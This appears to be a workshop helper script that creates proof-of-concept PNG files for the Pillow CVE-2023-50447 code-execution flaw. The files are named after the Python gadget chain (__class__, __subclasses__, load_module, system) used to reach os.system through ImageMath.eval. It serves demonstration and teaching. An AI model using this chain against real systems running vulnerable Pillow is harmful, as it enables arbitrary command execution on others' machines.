"""Create Pillow CVE-2023-50447 PoC image files (workshop build only)."""
from pathlib import Path

from PIL import Image

p = Path(__file__).parent / "demo-secrets" / "poc-images"
p.mkdir(parents=True, exist_ok=True)
for name in ("__class__", "__bases__", "__subclasses__", "load_module", "system"):
    Image.new("RGB", (1, 1)).save(p / name, format="PNG")
print("PoC images created for CVE-2023-50447")
